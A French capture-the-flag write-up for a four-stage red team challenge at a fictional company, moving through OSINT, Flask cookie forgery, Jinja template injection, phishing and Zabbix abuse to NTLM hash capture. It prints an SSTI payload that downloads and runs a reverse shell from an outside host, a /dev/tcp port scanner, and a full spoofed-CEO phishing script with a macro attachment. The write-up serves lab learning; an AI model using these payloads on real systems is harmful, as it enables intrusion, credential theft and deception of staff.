# ECW - Redteam

## RedTeam 1/4

### Description

The CSO of a famous company is looking for skilled hackers to join his team.

He sent the following challenge:

I setup a website to challenge your skill as a pentester
Find me over the Internet as I stand by the nickname Zer0DayH4ckz0r
If you reach my website you should be able to gain control of a server
You will then need to go deeper and find a pivot
Finally if your are good enough you will send me my own password as a NTLM hash
Good luck!

### Résolution

On part donc avec un nom d'utilisateur, si l'on recherche sur Google, on tombe assez rapidement sur un profil Twitter (https://twitter.com/Zer0DayH4ckz0r/) qui est un petit peu actif. En remontant à la création du compte, on remarque qu'il link son github (https://github.com/Zer0DayH4ckz0r/), on peut donc aller voir dessus.

Si l'on regarde tout ses répos, on remarque qu'il a fork et qu'il a commit sur le répo "instapy-cli". Son commit est celui-ci :

![img](Images/1.png)

On peut donc ensuite se rendre sur son compte instagram, principalement constitué de photos de chat :

![img](Images/2.png)

On peut remarquer qu'il y a une photo qui ressort du lot, c'est celle ou l'homme porte une capuche avec deux écrans d'ordinateurs, si l'on regarde plus attentivement la photo, on peut lire ce qu'il y a écrit sur le document word :

![img](Images/3.png)

On remarque notamment "PharmaHealthyCat" sur le document. Si l'on recherche ca sur internet, on tombe sur une page linkedin (https://fr.linkedin.com/in/eric-van-taten-68480120a) qui redirige vers la page LinkedIn du RSSI de l'entreprise (https://www.linkedin.com/in/jean-luc-delafont-78575720a/). On atteri enfin sur une dernière page LinkedIn (https://www.linkedin.com/company/pharmahealthycat/about/) avec un url dans la description : https://phealthycat.org.

Ici, si l'on va dans le blog, on obtient notre premier flag :

![img](Images/4.png)

### Flag

ECW{N1ckN4me_1s_G0Od_If_Y0u_D0n't_Thr0w}

## RedTeam 2/4

### Description

You found the website, this is a good start,
Now you need to get in!

### Résolution

Sur le site web, on peut se créer un compte, ce que j'ai fais directement, mais quand on se connecte, on remarque que nos accès sont encore très limités (il n'y a rien d'autre que lorsqu'on était non connecté):

![img](Images/5.png)

Si l'on regarde nos cookies, nous en avons deux :
```
ecw_sso : eyJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJFQ1dDVEYiLCJlbWFpbEFkZHJlc3MiOiJ3b3J0eUBjaGFsbGVuZ2UtZWN3LmZyIiwic3ViIjoiV29ydHkiLCJleHAiOjE2MzQ3MzI0NTF9.vLZ5exNcECY73ijlWovRrG8UanJ8727GxMVQu6TfsnaTRIQ9-zEHOwPSI-0qlBVwTC0T3dAS_kDqi0xDQjeI4dBQHNkGMLYbTqJORnFwG8adS3CAHe2pfwZs1NSKmsys3pBlJCyWKnHqPK9_wSCyFgk-sKyBfB9oRuAYKIbuFbkdC1n9h1soM4iBESItwKFVBQJpoR23hsQeZqshLQGaYxdt2N6dH3LwEezfv9NVVCowv1Gb6cxAn-eUD_WD4zJaERL62uI2w75Fjx_H_uFPRcz6wj6p02Rz3BZ_LM_gf-azSe2p9S7Gtr3JFNO2y3fk5GE0hc93fNcKPZimkq-yRQ

session : .eJwljkFqQzEMBe_idRa2JVlWLvORLImWQAv_J6uQu9fQ3WN4A_MuR55xfZX783zFrRzfXu5FOhFUZXaaNj2GQsyKKhUNYNhqTVbnZRqr77l8KSdXcBRKCYtGHQHaSkLprIMisQ8xXbhldYEqgmPUQWx9BOtE1pwh4pJlh7yuOP9reqsbrOvM4_n7iJ-NHFtCx_1uJCCijZt5VAxKIDJzdK4yyucPRYA_Rg.YW_UcQ.P3reJJFOyaTwMgnUdZVv8n7P9c0
```

Le token ecw_sso permet juste aux admins de l'ecw de nous authentifier sur le site, il ne doit donc pas être attaqué. Le cookie "session" me fait directement penser que l'application qui est derrière est développée en Flask.

![img](Images/6.png)

Une idée (par flemme) est de bruteforce le secret du token flask, car si l'on regarde ce qu'il contient, on voit notre "_user_id":

```sh
worty@medushack:~$ flask-unsign --decode --cookie '.eJwljkFqQzEMBe_idRa2JVlWLvORLImWQAv_J6uQu9fQ3WN4A_MuR55xfZX783zFrRzfXu5FOhFUZXaaNj2GQsyKKhUNYNhqTVbnZRqr77l8KSdXcBRKCYtGHQHaSkLprIMisQ8xXbhldYEqgmPUQWx9BOtE1pwh4pJlh7yuOP9reqsbrOvM4_n7iJ-NHFtCx_1uJCCijZt5VAxKIDJzdK4yyucPRYA_Rg.YW_UcQ.P3reJJFOyaTwMgnUdZVv8n7P9c0'
{'_fresh': True, '_id': '925530a77d58b8de6a3e804a904b336bc119c27cbaec219ccdca7f703d495f9ebe1524331cf54927a65ef4269bac4c11ad930994660657b26e7a847af8e99d9f', '_user_id': '210', 'csrf_token': 'd41f324e99159399a171bde04e5f355bbd4d7096'}
```

Si l'on tente de bruteforce le secret avec rockyou, on le trouve assez rapidement :
```sh
worty@medushack:~$ flask-unsign --unsign --cookie '.eJwljkFqQzEMBe_idRa2JVlWLvORLImWQAv_J6uQu9fQ3WN4A_MuR55xfZX783zFrRzfXu5FOhFUZXaaNj2GQsyKKhUNYNhqTVbnZRqr77l8KSdXcBRKCYtGHQHaSkLprIMisQ8xXbhldYEqgmPUQWx9BOtE1pwh4pJlh7yuOP9reqsbrOvM4_n7iJ-NHFtCx_1uJCCijZt5VAxKIDJzdK4yyucPRYA_Rg.YW_UcQ.P3reJJFOyaTwMgnUdZVv8n7P9c0' --wordlist rockyou.txt
[*] Session decodes to: {'_fresh': True, '_id': '925530a77d58b8de6a3e804a904b336bc119c27cbaec219ccdca7f703d495f9ebe1524331cf54927a65ef4269bac4c11ad930994660657b26e7a847af8e99d9f', '_user_id': '210', 'csrf_token': 'd41f324e99159399a171bde04e5f355bbd4d7096'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 896896 attemptsmcks
'key'
```

Ceci n'était pas attendu par les admins, ils ont juste oublié de changer la clé quand ils ont push le challenge :p

On peut donc maintenant resigné le token comme on le veut en modifiant les données à l'intérieur :

```sh
worty@medushack:~$ flask-unsign --sign --cookie "{'_fresh': True, '_id': '925530a77d58b8de6a3e804a904b336bc119c27cbaec219ccdca7f703d495f9ebe1524331cf54927a65ef4269bac4c11ad930994660657b26e7a847af8e99d9f', '_user_id': '1', 'csrf_token':
'd41f324e99159399a171bde04e5f355bbd4d7096'}" --secret "key"
.eJwljkFqQzEMRO_idRa2JVlWLvORLImWQAv_J6uQu9fQ3czwBt67HHnG9VXuz_MVt3J8e7kX6URQldlp2vQYCjErqlQ0gGGrNVmdl2msvuPypZxcwVEoJSwadQRoKwmlsw6KxD7EdOE-qwtUERyjDmLrI1gnsuYMEZcsW-R1xflv03Zd15nH8_cRP3twbAkdN9tIQEQbN_OoGJRAZOboXGWUzx_RlD7k.YW_XdA.GAiqMUwzEQBnFlesnqSn08mDWWo
```

Malheureusement, les utilisateurs ont le droit (quand ils sont admin), d'enlever les droits admin à n'importe qui, se qui fait que l'utilisateur "admin" n'est pas réellement admin. Avec un peu de bruteforce sur le _user_id, on trouve rapidement un compte qui lui est admin !

On observe une nouvelle page "Admin Menu", qui contient une sous page "Template Creator", ici pas besoin de chercher très loin, c'est une SSTI très basique. Je vais donc utiliser une des payloads de Podalirius (https://podalirius.net/fr/articles/python-vulnerabilities-code-execution-in-jinja-templates/), me permettant d'obtenir ma RCE.

Il reste un dernier problème, sur le docker qui run le challenge, il n'y a aucun binaire nous permettant d'obtenir un reverse shell (nc, perl, ...). Je vais donc créer un simple script c qui va me faire office de reverse shell. On va donc balancer cette payload :

```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.system("cd /tmp && wget http://monvps.fr/rev && chmod 777 rev && ./rev") }}
```

![img](Images/7.png)

On récupère bien notre reverse shell, ainsi que le flag de ce deuxième challenge.

### Flag

ECW{EaSy_P4rt_D0ne_C0ngratz}

## RedTeam 3/4

### Description

You got a step in the network,
Now is time to get serious!

### Résolution

Ici, étant donné qu'on est dans un docker, je vais directement télécharger le script "deepce.sh" pour savoir si un docker escape est potentiellement possible. Au vu de l'output, la réponse est non, mais on remarque trois autres dockers présents dans le network :

![img](Images/8.png)

Pour savoir que font ces dockers, je vais utiliser une fonction bash qui permet de smiluer (grossièrement) le comportement de nmap :

```sh
nmap2 () {
[[ $# -ne 1 ]] && echo "Please provide server name" && return 1

for i in {1..9000} ; do
  SERVER="$1"
  PORT=$i
  (echo  > /dev/tcp/$SERVER/$PORT) >& /dev/null &&
   echo "Port $PORT seems to be open"
done
}
```

Une fois le script exécute, on peut résumer cela sous la forme d'un tableau :

|    IP      |                Open Ports                   |               Role              |
|----------  |:-------------------------------------------:|--------------------------------:|
| 172.19.0.1 |  22,25,80,110,143,443,465,587,993,4242,8000 | Reverse proxy(out of challenge) |
| 172.19.0.2 |                    80                       |           Web Server            |
| 172.19.0.3 |                   3306                      |               BDD               |
| 172.19.0.4 |         25,110,143,465,587,993,995          |              SMTP               |

J'ai tenté de me connecter à la base de données avec un script en python, mais il n'y a rien d'intéressant dessus. Et là on peut se poser une question "Qu'est ce qu'un docker SMTP vient faire ici ?", il y a deux possibilités :
- Il faut l'attaquer pour se latéraliser dessus
- Il faut s'en servir

Rapplez-vous, le but final de ce challenge est de trouver le hash NTLM d'un utilisateur, et ce format de hash est utilisé sous windows, or ici, toutes les machines tournent sous linux. 

J'ai donc décidé de reregarder l'application python, et j'ai remarqué ceci dans un des fichiers de configuration :

```sh
cat /app/config/postfix-accounts.cf
lucie.bayard@phealthycat.org|{SHA512-CRYPT}$6$sFaFKg5Tb99UwufY$aVSMZhx8dgQpD3pR4WzpppIEsIOKDdhe2VXAAxzYlR8Tyb.RKriWP7UxVanVlThAwNRnL1ZiZM7nIVwBSxaP61
```

Ici on a donc une adresse mail ainsi qu'un mot de passe chiffré. Je n'ai même pas tenté de casser ce mot de passe, mais j'ai eu une intuition. Etant donné que l'on a fait de l'OSINT dans la première partie de ce challenge, on connait un peu les rôles de tout le monde dans l'entreprise, et on sait notamment que Lucie Bayard est une RH. De plus, le format d'adresse email est "prenom.nom@pheathycat.org", or on connait aussi le nom du CEO de la boite  (Michel Dalo), on peut donc tenter, via une macro word généré avec Metasploit, de faire ouvrir le fichier à la potentielle RH pour obtenir un meterpreter sur son ordinateur.

Pour cela, je vais utiliser ce script python pour envoyer le mail ainsi que la pièce jointe

```py
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

content="""Bonjour Madame Bayard,
Je vous envoi ce mail pour vous prévenir de l'arrivée de nouveaux employés au sein de notre service RH :
    - GALLARD Mattéo
    - BROHAN Solène

Ces deux personnes vont vous aider dans la gestion de l'entreprise, ainsi que des nouveaux employés qui vont arriver dans la cellule marketing.

Par ailleurs, nous avons reçu un nouveau logiciel permettant une gestion plus facile des personnes internes de l'entreprise, vous pouvez le télécharger ici : http://monvps.fr/SO_Rh_Setup_V1.exe

Votre clé d'activation est: KJPL-5968-NBQJ-1279
Cordialement,
Michel Dalo,
michel.dalo@phealthycat.org
02.51.26.53.25
CEO PhealthyCat"""

msg = MIMEMultipart()
msg['Subject'] = '[Ressources Humaines - Nouveaux employés et nouvel outil]'
msg['From'] = "michel.dalo@phealthycat.org"
msg['To'] = "lucie.bayard@phealthycat.org"

part = MIMEBase('application', "octet-stream")
part.set_payload(open("SoRH_Documentation_V1.docm", "rb").read())
encoders.encode_base64(part)

part.add_header('Content-Disposition', 'attachment; filename=SoRH_Documentation_V1.docm')

msg.attach(part)

server = smtplib.SMTP("172.19.0.4")
server.set_debuglevel(1)
server.sendmail("michel.dalo@phealthycat.org", ["lucie.bayard@phealthycat.org"], msg.as_string())
server.close()
```

Je mets donc un mutli/handler en écoute sur mon serveur, pour voir si la RH va cliquer sur le document, après quelques minutes d'attente on reçoit :

![img](Images/9.png)

On obtient bien notre meterpreter, et la machine est bien un windows :

![img](Images/10.png)

On va donc aller chercher notre flag qui se situe sur le bureau de Lucie !

### Flag

ECW{Hum4n_1s_Th3_W3akest_P0int}

## RedTeam 4/4

### Description

I see a mice hide in the network but now you need to get bigger and finish the job,
Boss fight time!

Flag must be submitted in the format ECW{NTLM_HASH} with hex-ascii hash encoding, example ECW{31d6cfe0d16ae931b73c59d7e0c089c0}

### Résolution

Ici il va falloir faire de l'énumération pour savoir quoi faire, je ne vais pas détailler ici avec des screenshots et toute la méthodologie, mais voici ce que j'ai fais dans les grandes lignes :

- SharpUp
- WinPeas
- Vérification des scheduled tasks
- Vérification des documents

Malheureusement, j'ai perdu du temps ici car je suis passé à côté du dossier "Downloads", dedans, on peut observer "zabbix_agent-5.4.4-windows-amd64-openssl.msi". Si l'on va voir du côté des "Program Files", on voit bien que le dossier "Zabbix Agent" est présent, avec un fichier de configuration. Dans celui-ci, les lignes les plus probantes sont :

```
ServerActive=192.168.12.234
...
Hostname=DESKTOP-M9DEL72
```

L'ip du serveur actif est "192.168.12.234" or notre ip actuel (dans le réseau interne) est "192.168.11.10". Il s'agit donc d'un autre PC sur lequel on pourrait potentiellement se latéraliser. Si l'on cherche des vulnérabilités sur Zabbix, on tombe rapidement sur ce github (https://github.com/Diefunction/ZabbixAPIAbuse). En effet, si on connait les credentials de base de Zabbix, cela va nous permettre de faire une exécution de code à distance. On va donc procéder de la manière suivante :

- Ajout d'une autoroute avec msf vers 192.168.11.0/24
- Ajout d'une autoroute avec msf vers 192.168.12.0/24
- Mise en place d'un service socks5 pour pouvoir taper sur le serveur Zabbix, et en abuser.

![img](Images/11.png)

![img](Images/12.png)

Maintenant que tout est en place, on va pouvoir essayer d'exécuter le script python pour abuser des fonctionnalités de Zabbix. Pour vérifier que cela marche, je vais tenter d'exfiltrer le résultat de la commande "whoami" via curl pour voir avoir quel user notre potentielle exécution de code est faite :

![img](Images/13.png)

Après un petit peu d'attente, je récupère le résultat de la commande sur mon port en écoute :

![img](Images/14.png)

Et là c'est intéressant, en effet, si vous avez bien suivi le scénario, on veut le hash NTLM du RSSI, or, selon le linkedin, le RSSI est Mr. DELAFONT. Avec cette exécution de code, nous sommes cet utilisateur !

Ici, je ne vais pas non plus décrire tout ce que j'ai fais. En effet, ce PC était protégé par un Windows Defender, j'ai dû utiliser un outil développé par un de mes amis, pour bypass et pouvoir avoir un meterpreter sur la machine. Une fois cela fait, j'ai fais les actions suivantes :
- SharpUp
- SharpHound

Mais je n'ai rien trouvé avec cela. J'ai donc ensuite tenter de mettre en place un responder sur mon PC pour voler le hash NTLMv2 de Mr. DELAFONT, et c'est ici que j'ai commis une erreur. En effet, nous pouvions accéder au challenge via VPN, j'ai donc mis mon responder en écoute, mais sur mon interface eth0... et évidemment, je n'ai eu aucune output. Après beaucoup de recherches, j'ai retenté un responder mais cette fois-ci en me mettant en écoute sur la bonne interface (celle connectée au VPN). Pour pouvoir récupérer son hash NTLM, meme pas besoin d'avoir un meterpreter sur le PC pour le faire taper sur mon responder, en effet, nous avons déjà une exécution de code en tant que Mr. DELAFONT grâce au serveur zabbix, on peut donc simplement mettre la commande qui va nous servir à voler son hash dans la valeur "CMD" de l'exploit en python.

![img](Images/15.png)

Et côté responder, on observe bien que notre commande a marché :

```sh
[SMB] NTLMv2-SSP Client   : 10.4.0.8
[SMB] NTLMv2-SSP Username : PHEALTHYCAT\jldelafont
[SMB] NTLMv2-SSP Hash     : jldelafont::PHEALTHYCAT:8604f3b2d12d3f50:B4A0B03855BD1D20B00BB62E8D07EDAF:0101000000000000C0653150DE09D201AD0B2A7CD88CD7F5000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000200000D94B9DA7CA1D69A2434AC4F7592B55064A32E317694E1AF7DE98EA1AC02844320A0010000000000000000000000000000000000009001C0063006900660073002F00310030002E0035002E0031002E00370033000000000000000000
```

On a donc son hash NTLMv2, mais nous, nous voulons son hash NTLM. Ici, j'ai pensé à utiliser hashcat avec rockyou, pour voir si Mr. DELAFONT n'avait pas un mot de passe faible :

![img](Images/16.png)

Après meme pas une seconde, on récupère le mot de passe en clair de notre cible "Blink182". Il ne reste maintenant plus qu'à générer son hash NTLM pour obtenir notre précieux dernier flag. Pour cela j'utilise la librarie impacket qui est très très pratique !

### Flag

ECW{c2367169e3279fa3e85d9d25f0e85e45}

Un grand merci à @Zk_Clown pour ce challenge super quali !
